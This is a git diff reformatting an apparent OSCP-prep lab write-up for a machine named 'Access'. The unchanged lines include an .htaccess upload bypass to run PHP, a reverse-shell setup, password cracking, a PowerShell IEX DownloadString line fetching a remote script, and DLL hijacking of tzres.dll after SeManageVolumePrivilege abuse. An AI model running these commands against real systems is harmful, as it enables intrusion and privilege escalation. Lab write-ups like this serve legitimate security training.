@@ -1,7 +1,7 @@
 ---
 layout: /src/layouts/PostLayout.astro
 title: Access
-tags: ["priv-esc", "gobuster", "ssh", "persistence", "burpsuite", "directory-traversal"]
+tags: ["dll-hijacking", "FileUploadAttacks", "kerberoasting", "SeManageVolumePrivilege"]
 ---
 
 **Start 10:12 19-05-2025**
@@ -11,9 +11,9 @@ tags: ["priv-esc", "gobuster", "ssh", "persistence", "burpsuite", "directory-tra
 Scope:
 192.168.102.187
 ```
-# Recon
+## Recon
 
-## Nmap
+### Nmap
 
 ```bash
 sudo nmap -sC -sV access -sT -vvvv -p- -Pn -T5 --min-rate=5000
@@ -147,9 +147,9 @@ Apparently we can try and overwrite the `.htaccess` file by uploading our own wh
 ```bash
 echo "AddType application/x-httpd-php .pwn" > .htaccess
 ```
-
->[!info]
->We create a new file type which we will allow via the `.htaccess` file, we should then be able to upload the file and treat it as an `php` file
+:::info
+We create a new file type which we will allow via the `.htaccess` file, we should then be able to upload the file and treat it as an `php` file
+:::
 
 ![](../../../assets/a5a4f0e7fe2a225589af8315dcfe5730.png)
 
@@ -157,8 +157,8 @@ echo "AddType application/x-httpd-php .pwn" > .htaccess
 
 ![](../../../assets/688cf1d4770fd05b422ecb4873f5b470.png)
 
-# Foothold
-## Shell as svc_apache
+## Foothold
+### Shell as svc_apache
 
 We boot up a listener before uploading the file.
 
@@ -204,8 +204,9 @@ Nice and easy, let's try and crack it.
 
 ![](../../../assets/b9f29f09dcf44c3d9b5f1d1156c3d4c8.png)
 
->[!success]
->`john` cracks it INSTANTLY.
+:::note
+`john` cracks it INSTANTLY.
+:::
 
 ```
 svc_mssql
@@ -244,8 +245,8 @@ Powershell IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.4
 
 ![](../../../assets/6718942627c479bb07be03e0f2cc363e.png)
 
-# Privilege Escalation
-## SeManageVolumePrivilege
+## Privilege Escalation
+### SeManageVolumePrivilege
 
 ![](../../../assets/5fbd9b126f1518845d76e764d0c5fb40.png)
 
@@ -263,21 +264,22 @@ Simply download and execute it:
 
 Now we can write files to the `C:\` drive.
 
->[!tip]
->Why is this useful you say? Well because there's a shit ton of DLL's inside the `/Windows/System32` folder which we can now hijack using our own crafter reverse shell!
+:::note
+Why is this useful you say? Well because there's a shit ton of DLL's inside the `/Windows/System32` folder which we can now hijack using our own crafted reverse shell!
+:::
 
 ## DLL Hijacking
 
 We will be using the `tzres.dll` file.
 
->[!info]
->I could've used any `.dll` but was too lazy to do my research so I used a proven one.
+:::note
+I could've used any `.dll` but was too lazy to do my research so I used a proven one.
+:::
 
 ![](../../../assets/b7adee2106900f239127676e703a5432.png)
 
 ![](../../../assets/5ca2c5b22ca1e13db78d7e952b4b5945.png)
 
->[!success]
 >The good thing about hijacking this dll is that you can then call upon it by issuing `systeminfo`:
 
 ![](../../../assets/9cd5424701d5e5e4b42e08215c7ab6d2.png)
@@ -295,5 +297,3 @@ Eventhough it says it failed it really didn't:
 **Finished 12:28 19-05-2025**
 
 [^Links]: [[OSCP Prep]]
-
-#dll-hijacking #FileUploadAttacks #kerberoasting  #SeManageVolumePrivilege
